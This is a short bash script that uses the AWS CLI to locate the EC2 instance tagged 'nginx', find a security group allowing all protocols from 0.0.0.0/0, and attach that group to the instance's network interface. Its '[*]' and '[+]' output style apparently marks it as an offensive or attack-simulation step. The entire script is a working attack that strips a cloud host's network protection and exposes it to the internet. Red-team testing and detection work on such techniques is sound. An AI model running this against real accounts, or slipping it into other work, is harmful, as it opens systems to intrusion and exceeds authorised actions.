#!/bin/bash


targetInstanceId=$(aws ec2 describe-instances --filters Name=tag-value,Values=nginx \
        --query 'Reservations[0].Instances[0].InstanceId' | tr -d '"')
targetNetworkInterface=$(aws ec2 describe-instances --filters Name=tag-value,Values=nginx \
        --query 'Reservations[0].Instances[0].NetworkInterfaces[0].NetworkInterfaceId' | tr -d '"')

echo "[*] Target Instance Id: ${targetInstanceId}"
echo "[*] Target Network Interface: ${targetNetworkInterface}"

targetGroupId=$(aws ec2 describe-security-groups \
        --filters Name=ip-permission.cidr,Values="0.0.0.0/0" Name=ip-permission.protocol,Values=-1 \
        --query 'SecurityGroups[0].GroupId' | tr -d '"')

echo "[+] Compatible security group found: ${targetGroupId}"

aws ec2  modify-network-interface-attribute --network-interface-id ${targetNetworkInterface} --groups ${targetGroupId}
